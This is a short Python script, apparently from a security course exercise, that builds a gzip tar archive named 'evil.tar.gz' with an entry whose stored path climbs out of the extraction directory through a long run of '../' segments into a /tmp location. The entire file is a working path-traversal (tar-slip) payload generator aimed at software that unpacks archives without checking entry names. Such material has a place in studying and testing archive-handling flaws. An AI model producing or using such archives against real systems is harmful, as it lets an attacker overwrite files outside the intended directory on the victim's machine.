import tarfile

mode = "w:gz"
tar_file = "evil.tar.gz"

with open("password_file", "w") as password_file:
    password_file.write("password")

password_file = "password_file"
password_file_malicious = "../../../../../../../../../../tmp/z5361001/password" 

tf = tarfile.open(tar_file, mode)
tf.add(password_file, password_file_malicious)
tf.close()